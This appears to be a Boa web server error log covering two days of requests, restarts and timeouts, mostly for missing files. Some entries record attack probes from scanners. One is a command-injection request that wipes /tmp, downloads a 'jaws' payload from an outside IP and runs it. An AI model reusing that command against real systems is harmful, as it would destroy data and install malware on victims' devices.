+[11/Apr/2023:07:49:32 +0000] request from 152.32.242.11 "GET /robots.txt HTTP/1.1" ("/home/boa/www/robots.txt"): document open: No such file or directory
+[11/Apr/2023:07:49:32 +0000] request from 152.32.242.11 "GET /sitemap.xml HTTP/1.1" ("/home/boa/www/sitemap.xml"): document open: No such file or directory
+[11/Apr/2023:07:51:56 +0000] request from 185.187.239.242 "GET /default.html HTTP/1.1" ("/home/boa/www/default.html"): document open: No such file or directory
+[11/Apr/2023:07:52:00 +0000] request from 185.187.239.242 "GET /css/style.css HTTP/1.1" ("/home/boa/www/css/style.css"): document open: No such file or directory
+[11/Apr/2023:08:01:15 +0000] request from 149.18.73.184 "GET //level/15/exec/-/sh/run/CR HTTP/1.1" ("/home/boa/www/level/15/exec/-/sh/run/CR"): document open: No such file or directory
+[11/Apr/2023:08:18:37 +0000] request from 185.187.239.242 "GET /css/style.css HTTP/1.1" ("/home/boa/www/css/style.css"): document open: No such file or directory
+[11/Apr/2023:08:18:42 +0000] request from 185.187.239.242 "GET /css/style.css HTTP/1.1" ("/home/boa/www/css/style.css"): document open: No such file or directory
+[11/Apr/2023:08:19:46 +0000] request from 185.187.239.242 "GET /css/style.css HTTP/1.1" ("/home/boa/www/css/style.css"): document open: No such file or directory
+[11/Apr/2023:08:19:48 +0000] request from 185.187.239.242 "GET /default.html HTTP/1.1" ("/home/boa/www/default.html"): document open: No such file or directory
+[11/Apr/2023:08:20:03 +0000] request from 185.187.239.242 "GET /css/style.css HTTP/1.1" ("/home/boa/www/css/style.css"): document open: No such file or directory
+[11/Apr/2023:08:20:11 +0000] request from 185.187.239.242 "GET /default.html HTTP/1.1" ("/home/boa/www/default.html"): document open: No such file or directory
+[11/Apr/2023:08:20:11 +0000] request from 185.187.239.242 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[11/Apr/2023:08:20:13 +0000] request from 185.187.239.242 "GET /css/style.css HTTP/1.1" ("/home/boa/www/css/style.css"): document open: No such file or directory
+[11/Apr/2023:08:20:53 +0000] request from 185.187.239.242 "GET /default.html HTTP/1.1" ("/home/boa/www/default.html"): document open: No such file or directory
+[11/Apr/2023:08:20:59 +0000] request from 185.187.239.242 "GET /css/style.css HTTP/1.1" ("/home/boa/www/css/style.css"): document open: No such file or directory
+[11/Apr/2023:08:21:03 +0000] request from 185.187.239.242 "GET /css/style.css HTTP/1.1" ("/home/boa/www/css/style.css"): document open: No such file or directory
+[11/Apr/2023:08:21:56 +0000] request from 185.187.239.242 "GET /default.html HTTP/1.1" ("/home/boa/www/default.html"): document open: No such file or directory
+[11/Apr/2023:08:21:57 +0000] request from 185.187.239.242 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[11/Apr/2023:08:52:35 +0000] request from 185.187.239.242 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[11/Apr/2023:11:21:38 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[11/Apr/2023:11:22:34 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[11/Apr/2023:11:43:28 +0000] request from 45.56.108.128 "GET /systembc/password.php HTTP/1.0" ("/home/boa/www/systembc/password.php"): document open: No such file or directory
+[11/Apr/2023:12:03:39 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[11/Apr/2023:12:14:11 +0000] request from 184.105.247.252 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[11/Apr/2023:12:15:15 +0000] request from 184.105.247.252 "GET /geoserver/web/ HTTP/1.1" ("/home/boa/www/geoserver/web/"): document open: No such file or directory
+[11/Apr/2023:12:18:36 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[11/Apr/2023:12:19:20 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[11/Apr/2023:12:20:22 +0000] request from 117.176.186.164 "(null)" ("(null)"): connection timed out
+[11/Apr/2023:12:20:27 +0000] caught SIGHUP, restarting
+[11/Apr/2023:12:20:27 +0000] re-reading configuration files
+[11/Apr/2023:12:20:27 +0000] successful restart
+[11/Apr/2023:12:20:27 +0000] caught SIGTERM, starting shutdown
+[11/Apr/2023:12:20:27 +0000] exiting Boa normally (uptime 440570 seconds)
+[11/Apr/2023:15:37:23 +0000] boa: server version Boa/0.94.13
+[11/Apr/2023:15:37:23 +0000] boa: server built Oct 11 2022 at 11:38:52.
+[11/Apr/2023:15:37:23 +0000] boa: starting server pid=1334, port 80
+[11/Apr/2023:15:37:41 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[11/Apr/2023:15:39:37 +0000] request from 37.38.246.206 "GET /shell?cd+/tmp;rm+-rf+*;wget+45.81.243.34/jaws;sh+/tmp/jaws HTTP/1.1" ("/home/boa/www/shell"): document open: No such file or directory
+[11/Apr/2023:15:40:06 +0000] request from 117.176.186.164 "(null)" ("(null)"): connection timed out
+[11/Apr/2023:15:40:11 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[11/Apr/2023:15:41:17 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[11/Apr/2023:15:42:44 +0000] request from 117.176.186.164 "(null)" ("(null)"): connection timed out
+[11/Apr/2023:15:42:50 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[11/Apr/2023:15:44:31 +0000] request from 117.176.186.164 "(null)" ("(null)"): connection timed out
+[11/Apr/2023:15:51:13 +0000] request from 134.122.135.54 "GET /voddetail/76601.html HTTP/1.1" ("/home/boa/www/voddetail/76601.html"): document open: No such file or directory
+[11/Apr/2023:15:52:40 +0000] caught SIGTERM, starting shutdown
+[11/Apr/2023:15:52:40 +0000] exiting Boa normally (uptime 917 seconds)
+[11/Apr/2023:16:02:38 +0000] boa: server version Boa/0.94.13
+[11/Apr/2023:16:02:38 +0000] boa: server built Oct 11 2022 at 11:38:52.
+[11/Apr/2023:16:02:38 +0000] boa: starting server pid=1760, port 80
+[11/Apr/2023:16:02:59 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[11/Apr/2023:16:05:10 +0000] request from 117.176.186.164 "(null)" ("(null)"): connection timed out
+[11/Apr/2023:16:21:31 +0000] boa: server version Boa/0.94.13
+[11/Apr/2023:16:21:31 +0000] boa: server built Oct 11 2022 at 11:38:52.
+[11/Apr/2023:16:21:31 +0000] boa: starting server pid=1500, port 80
+[11/Apr/2023:16:22:05 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[11/Apr/2023:16:23:12 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[11/Apr/2023:16:23:35 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[11/Apr/2023:16:26:37 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[11/Apr/2023:16:28:41 +0000] request from 117.176.186.164 "(null)" ("(null)"): connection timed out
+[11/Apr/2023:16:29:32 +0000] request from 117.176.186.164 "(null)" ("(null)"): connection timed out
+[11/Apr/2023:16:32:18 +0000] caught SIGHUP, restarting
+[11/Apr/2023:16:32:18 +0000] re-reading configuration files
+[11/Apr/2023:16:32:18 +0000] successful restart
+[11/Apr/2023:16:32:18 +0000] caught SIGTERM, starting shutdown
+[11/Apr/2023:16:32:18 +0000] exiting Boa normally (uptime 647 seconds)
+[12/Apr/2023:01:52:40 +0000] boa: server version Boa/0.94.13
+[12/Apr/2023:01:52:40 +0000] boa: server built Oct 11 2022 at 11:38:52.
+[12/Apr/2023:01:52:40 +0000] boa: starting server pid=956, port 80
+[12/Apr/2023:01:53:10 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[12/Apr/2023:01:53:52 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[12/Apr/2023:01:55:55 +0000] request from 117.176.186.164 "(null)" ("(null)"): connection timed out
+[12/Apr/2023:01:55:55 +0000] request from 117.176.186.164 "(null)" ("(null)"): connection timed out
+[12/Apr/2023:01:56:31 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[12/Apr/2023:01:56:57 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[12/Apr/2023:01:58:29 +0000] request from 117.176.186.164 "(null)" ("(null)"): connection timed out
+[12/Apr/2023:02:00:16 +0000] request from 117.176.186.164 "(null)" ("(null)"): connection timed out
+[12/Apr/2023:02:00:16 +0000] request from 117.176.186.164 "(null)" ("(null)"): connection timed out
+[12/Apr/2023:02:02:29 +0000] request from 117.176.186.164 "(null)" ("(null)"): connection timed out
+[12/Apr/2023:02:02:29 +0000] request from 117.176.186.164 "(null)" ("(null)"): connection timed out
+[12/Apr/2023:02:08:07 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[12/Apr/2023:02:10:49 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[12/Apr/2023:02:21:00 +0000] request from 185.187.239.242 "GET /modify_password.php?username=JOJO&old_password=123456&new_password=111111 HTTP/1.1" ("/home/boa/www/modify_password.php"): document open: No such file or directory
+[12/Apr/2023:02:33:02 +0000] request from 185.187.239.242 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[12/Apr/2023:02:33:13 +0000] request from 185.187.239.242 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[12/Apr/2023:02:35:22 +0000] request from 185.187.239.242 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[12/Apr/2023:02:38:21 +0000] request from 185.187.239.242 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[12/Apr/2023:02:43:53 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[12/Apr/2023:02:44:04 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[12/Apr/2023:02:45:11 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[12/Apr/2023:02:45:22 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[12/Apr/2023:02:45:38 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[12/Apr/2023:02:46:10 +0000] request from 117.176.186.164 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[12/Apr/2023:02:49:35 +0000] request from 117.176.186.164 "(null)" ("(null)"): connection timed out
+[12/Apr/2023:02:49:37 +0000] malformed request: ""
+[12/Apr/2023:02:51:39 +0000] request from 117.176.186.164 "(null)" ("(null)"): connection timed out
+[12/Apr/2023:02:53:26 +0000] request from 117.176.186.164 "(null)" ("(null)"): connection timed out
+[12/Apr/2023:02:55:28 +0000] request from 117.176.186.164 "(null)" ("(null)"): connection timed out
+[12/Apr/2023:03:01:43 +0000] malformed request: ""
+[12/Apr/2023:03:02:20 +0000] malformed request: ""
+[12/Apr/2023:03:02:44 +0000] request from 69.164.217.74 "(null)" ("(null)"): header read: Connection reset by peer
+[12/Apr/2023:03:03:19 +0000] malformed request: ""
+[12/Apr/2023:03:03:58 +0000] request from 117.176.186.164 "(null)" ("(null)"): connection timed out
+[12/Apr/2023:03:03:58 +0000] request from 117.176.186.164 "(null)" ("(null)"): connection timed out
+[12/Apr/2023:03:04:37 +0000] malformed request: ""
+[12/Apr/2023:03:05:19 +0000] request from 69.164.217.74 "(null)" ("(null)"): connection timed out
+[12/Apr/2023:03:05:38 +0000] malformed request: "*1"
+[12/Apr/2023:03:15:02 +0000] request from 117.176.186.164 "(null)" ("(null)"): connection timed out
+[12/Apr/2023:03:15:03 +0000] request from 117.176.186.164 "(null)" ("(null)"): connection timed out
